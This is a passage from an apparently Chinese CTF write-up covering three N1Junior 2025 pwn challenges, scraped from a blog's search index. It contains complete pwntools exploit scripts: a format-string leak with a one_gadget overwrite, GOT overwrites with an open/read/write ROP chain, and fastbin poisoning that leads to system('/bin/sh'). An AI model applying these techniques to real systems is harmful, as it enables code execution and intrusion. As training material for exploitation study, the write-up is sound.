#----------------------------------------------------------------- pl = b'%8c%30$hhn%9$p' # dbg() sl(pl) ru(b\"0x\") pie = int(r(16),16) - 0x1279 success(\"pie = 0x%x\",pie) 发送payload之后，再dbg，在重新执行时，查看printf时的栈情况 再在栈中寻找stack地址和libc地址，再通过覆盖返回地址为one_gadget，实现getshell 最终exp: from pwn import * context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) pause() address = './remake' p = process(address) elf = ELF(address) libc = ELF(\"./libc.so.6\") # ip = \"\" # port = #p = remote(ip,port) #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) #----------------------------------------------------------------- pl = b'%8c%30$hhn%9$p' # dbg() sl(pl) ru(b\"0x\") pie = int(r(16),16) - 0x1279 success(\"pie = 0x%x\",pie) pl = b\"%12$p%26$p\" #stack libc # dbg() sl(pl) # ru(b\"0x\") ru(b\"0x\") stack = int(r(12),16) - 0x40 ru(b\"0x\") libc_addr = int(r(12),16) - 0x216600 success(\"stack=0x%x\",stack) success(\"libc_base=0x%x\",libc_addr) stack_ret_addr = stack + 8 pop_rdi_ret = libc_addr + 0x2a3e5 binsh_addr = libc_addr + next(libc.search(b\"/bin/sh\")) system_addr = libc_addr + libc.sym[\"system\"] one = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43] one_addr = libc_addr + one[4] payload2 = fmtstr_payload(6,{stack_ret_addr:one_addr}) # dbg() s(payload2) itr() ","date":"2025-03-12","objectID":"/posts/n1junior2025/:1:0","tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#remake"},{"categories":["WP"],"collections":null,"content":"write_at_will\rArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2025-03-12","objectID":"/posts/n1junior2025/:2:0","tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#write_at_will"},{"categories":["WP"],"collections":null,"content":"逆向分析\r程序开了沙箱 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return KILL 0003: 0x20 0x00 0x00 0x00000000 A = sys_number 0004: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0006: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0008: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x15 0x00 0x01 0x00000101 if (A != openat) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x15 0x00 0x01 0x00000003 if (A != close) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x06 0x00 0x00 0x00000000 return KILL 只允许了exit、read、write、openat、close 要通过 openat、read、write读出flag，这里注意要在当前目录下创建一个flag ","date":"2025-03-12","objectID":"/posts/n1junior2025/:2:1","tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#逆向分析"},{"categories":["WP"],"collections":null,"content":"思路\r程序中没留后门函数，需要libc，先泄露libc 改printf_got为gets，改exit_got为0x40165a，改__stack_chk_fail为ret。这样相当于做ROP 写openat+read+write的ROP链 在call __stack_chk_fail的时候会push下一条指令的地址 from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) exit_got = elf.got['exit'] def arb_write(address,content): p.sendlineafter(b'. Exit\\n',b'1') p.sendafter(b'get?',str(address).encode()) p.send(p32(content)) #泄露libc p.sendlineafter(b'3. Exit\\n',b'2') p.sendafter(b'get?',str(0x404038).encode()) p.recvuntil(b'\\x0a') libc_base = u64(p.recv(6)[-7:].ljust(8,b'\\x00')) - 0x7330237b97d0 + 0x7330236a5000 success(\"libc ---\u003e 0x%x\",libc) gets_addr = libc_base + libc.symbols['gets'] #改printf为gets arb_write(0x404030,gets_addr\u00260xffffffff) #改exit_got arb_write(exit_got,0x40165a) #改stack chk fail 为 ret指令 arb_write(0x404028,0x40101a) openat = libc_base + libc.symbols['openat'] read = libc_base + libc.symbols['read'] write = libc_base + libc.symbols['write'] exit_addr = libc_base + libc.symbols['exit'] pop_rdi_ret = libc_base + 0x000000000002a3e5 pop_rsi_ret = libc_base + 0x000000000002be51 pop_rdx_rcx_rbx_ret = libc_base + 0x0000000000108b03 ret = 0x40101a pl = b'a'*0xa + p64(ret)*8 pl += p64(pop_rdi_ret) + p64(0x404200) + p64(gets_addr) pl += p64(pop_rdi_ret) + p64(0xffffff9c) + p64(pop_rsi_ret) + p64(0x404200) +p64(pop_rdx_rcx_rbx_ret) + p64(0)*3 + p64(openat) pl += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(0x404300) + p64(pop_rdx_rcx_rbx_ret) + p64(0x100)*3 + p64(read) pl += p64(pop_rdi_ret) + p64(1) + p64(write) # dbg() p.sendline(pl) p.sendline(b'/flag\\x00') p.interactive() ","date":"2025-03-12","objectID":"/posts/n1junior2025/:2:2","tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#思路"},{"categories":["WP"],"collections":null,"content":"oldwine\r","date":"2025-03-12","objectID":"/posts/n1junior2025/:3:0","tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#oldwine"},{"categories":["WP"],"collections":null,"content":"逆向分析\r菜单题 add： 根据读入的data_size申请堆块，chunk限制小于等于0x60 并把读入的account、password、堆块地址八字节一写，写0x18一组进0x602040 最后把password根据password的第一个字节对其进行异或加密，还把存储的堆地址的最后一个字节给加密了 delete： free掉堆块，把account、password、堆块地址置0 show： 输入idx，验证password，通过就打印account和data data这里用的是%s，没有\\x00就会一直输出 需要知道的几个点： 把密码的最后一个字节设置成\\x00，就能绕过加密 我们free掉的是加密后的堆地址，可以通过控制加密后的地址，实现邻近地址的任意free（这也是这道题的核心利用点） 我的思路： 泄露libc： 通过libc中的__environ泄露栈地址： 到栈上做ROP： 首先这么构造堆块 data = p64(0)+p64(0x91) add(p64(0x123),p8(0x50),0x10,data) #0 data = p64(0) + p64(0xa1) add(p64(0x123),p64(0),0x50,data) #1 data = b'aaaa' add(p64(0x123),p64(0),0x40,data) #2 add(p64(0x123),p64(0),0x10,data) #3 可以看到经过异或加密，delete(0)的时候，实际上是去delete那个伪造的unsorted bin 接下来，再去把哪个Unsorted bin中的堆块申请出来的时候，其中的libc地址还在那里，泄露出来就行 delete(0,p8(0x50)) #0被free data = b'p'*8 add(p64(0x123),p64(0),0x20,data) #0 show(0,p64(0)) p.recvuntil(b'p'*8) libc_base = u64(p.recv(6).ljust(8,b'\\x00')) - 0x3c4c08 success(\"libc_base -\u003e 0x%x\",libc_base) environ = libc_base + libc.symbols['__environ'] environ_lastbyte = environ \u0026 0xff success(\"environ -\u003e 0x%x\",environ) 接下来，通过伪造fastbin的fd，把堆块申请到bss上 delete(2,p64(0)) #进入fastbin #2被free #覆盖fastbin中堆块的fd pl = p64(0)*3 + p64(0x51) + p64(0x602098) #绕过对fastbin的size的检查 add(p64(0x123),p64(0),0x50,pl) #2 这部分delete(2)之后的堆结构： 然后申请的是0x60的chunk，fastbin没有满足的，unsortedbin中有一个满足，又因为0x70-0x60 \u003c 0x20，如果切割剩下的堆块小于0x20，所以整个都给分配出来，再往fastbin的fd写入bss地址 接着往bss上写入environ去泄露栈地址： add(p64(0x50),p64(0),0x40,data) #4 #泄露栈地址 data = p64(0) + p64(environ) add(p64(0x123),p64(0),0x40,data) #5，0x6020a8 show(4,p64(0)) p.recvuntil(b'[data]: ') stack_addr = u64(p.recv(6).ljust(8,b'\\x00')) success(\"stack_addr -\u003e 0x%x\",stack_addr) 做ROP的环节还是覆盖fastbin的fd，讲一下比较关键的部分： 我们可以执行下面的命令来看看申请fastbin到哪里，怎么申请： 有两个地址可以供我们使用，但是有一个是需要0x70的fastbin，我们最大只能申请0x60的chunk，所以用第二个。把堆申请到这里，再去system(\"/bin/sh\")就可以了 ","date":"2025-03-12","objectID":"/posts/n1junior2025/:3:1","tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#逆向分析-1"},{"categories":["WP"],"collections":null,"content":"exp\r其实感觉还有更简单的方法 from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc ip = \"host.docker.internal\" port = 5555 # p = remote(ip,port) def cmd(idx): p.recvuntil(b'\u003e\u003e ') p.sendline(str(idx).encode()) def add(account,password,size,data): cmd(1) p.sendafter(b'[account]: ',account) p.sendafter(b'[password]: ',password) p.sendafter(b'[data size]: ',str(size)) p.sendafter(b'[data]: ',data) def delete(idx,password): cmd(2) p.sendafter(b'[idx]: ',str(idx).encode()) p.sendafter(b'[verify]: ',password) def show(idx,password): cmd(3) p.sendafter(b'[idx]: ',str(idx).encode()) p.sendafter(b'[verify]: ',password) #泄露libc data = p64(0)+p64(0x91) add(p64(0x123),p8(0x50),0x10,data) #0 data = p64(0) + p64(0xa1) add(p64(0x123),p64(0),0x50,data) #1 data = b'aaaa' add(p64(0x123),p64(0),0x40,data) #2 add(p64(0x123),p64(0),0x10,data) #3 delete(0,p8(0x50)) #0被free data = b'p'*8 add(p64(0x123),p64(0),0x20,data) #0 show(0,p64(0)) p.recvuntil(b'p'*8) libc_base = u64(p.recv(6).ljust(8,b'\\x00')) - 0x3c4c08 success(\"libc_base -\u003e 0x%x\",libc_base) environ = libc_base + libc.symbols['__environ'] environ_lastbyte = environ \u0026 0xff success(\"environ -\u003e 0x%x\",environ) delete(2,p64(0)) #进入fastbin #2被free #覆盖fastbin中堆块的fd pl = p64(0)*3 + p64(0x51) + p64(0x602098) #绕过对fastbin的size的检查 add(p64(0x123),p64(0),0x50,pl) #2 add(p64(0x50),p64(0),0x40,data) #4 #泄露栈地址 data = p64(0) + p64(environ) add(p64(0x123),p64(0),0x40,data) #5，0x6020a8 show(4,p64(0)) p.recvuntil(b'[data]: ') stack_addr = u64(p.recv(6).ljust(8,b'\\x00')) success(\"stack_addr -\u003e 0x%x\",stack_addr) #ROP data = b'aaaa' add(p64(0x123),p64(0x30),0x10,data) #6 pl = p64(0) + p64(0x61) + p64(0) + p64(0x61) add(p64(0x123),p64(0),0x50,pl)#7 #下面这两个堆块用于防止consolidate和对invalid next size (fast)的检测 data = p64(0) + p64(0x51) add(p64(0x123),p64(0),0x10,data)#8 data = p64(0)*2 + p64(0) + p64(0x31) add(p64(0x123),p64(0xe0),0x20,data)#9 delete(9,p64(0xe0)) #可以控制堆块 delete(6,p64(0x30)) #改堆块8的size为0x41,做ROP pl = p64(0) + p64(0x61) + p64(0)*7 + p64(0x41) add(p64(0x123),p64(0),0x50,pl) #6 #接下来free掉堆块8,其size为0x41,进入fast bin add(p64(0x123),p64(0),0x10,data) #9 add(p64(0x123),p64(0),0x10,data) #10 delete(8,p64(0)) #改堆块8的fd为栈地址,让其size为0x40 fake_fast_addr = stack_addr - 0x136 rbp = stack_addr + 0xf8 pl = p64(0)*7 + p64(0x41) + p64(fake_fast_addr) success(\"fake_fast_addr -\u003e 0x%x\",fake_fast_addr) add(p64(0x123),p64(0),0x50,pl)#8 add(p64(0x123),p64(0),0x30,data) #11 system_addr = libc_base + libc.sym['system'] binsh_addr = libc_base + next(libc.search(\"/bin/sh\")) pop_rdi_ret = 0x0000000000400df3 pl = b'\\x00'*6 + p64(0) + p64(rbp) pl+=p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) add(p64(0x123),p64(0),0x30,pl) # dbg() p.interactive() ","date":"2025-03-12","objectID":"/posts/n1junior2025/:3:2","tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#exp"}]